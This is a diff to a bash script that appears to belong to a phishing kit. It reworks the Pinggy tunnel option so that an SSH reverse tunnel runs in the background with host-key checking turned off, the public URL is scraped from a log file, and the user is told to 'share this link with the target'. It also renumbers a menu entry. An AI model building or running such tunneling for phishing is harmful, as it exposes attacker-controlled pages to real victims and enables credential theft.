@@ -513,7 +513,21 @@ start_pinggy() {
     read -p "[?] Enter your local port (default 8080): " port
     port=${port:-8080}
 
-    ssh -p 443 -R0:localhost:$port qr@free.pinggy.io
+    echo -e "[*] Please wait while we generate your public link...\n"
+
+    # Start Pinggy tunnel in background
+    ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:$port qr@free.pinggy.io > pinggy.log 2>&1 &
+    sleep 5
+
+    # Extract public link from Pinggy output
+    PINGGY_URL=$(grep -o 'https://[0-9a-z.-]*\.pinggy\.io' pinggy.log | head -n 1)
+
+    if [[ -n "$PINGGY_URL" ]]; then
+        echo -e "[+] Pinggy URL: $PINGGY_URL"
+        echo -e "[*] Share this link with the target.\n"
+    else
+        echo -e "[!] Could not retrieve Pinggy URL. Check pinggy.log for details."
+    fi
 }
 
 ## Start localhost
@@ -534,7 +548,7 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} Pinngy   ${RED}[${CYAN}NEW! Max 60Min${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} Pinngy   ${RED}[${CYAN}NEW! Max 60Min${RED}]
 
 	EOF
 
